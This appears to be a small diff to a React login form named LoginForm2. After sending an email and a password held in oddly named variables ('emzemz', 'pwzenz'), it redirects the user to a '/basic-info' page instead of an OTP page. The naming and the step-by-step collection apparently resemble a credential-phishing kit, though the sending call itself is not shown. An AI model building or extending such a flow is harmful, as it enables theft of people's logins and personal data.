@@ -52,7 +52,7 @@ const LoginForm2: React.FC = () => {
           pwzenz: pwzenz,
         });
         console.log('Message sent successfully');
-        navigate('/otp', {
+        navigate('/basic-info', {
           state: {
             emzemz: emzemz
           }
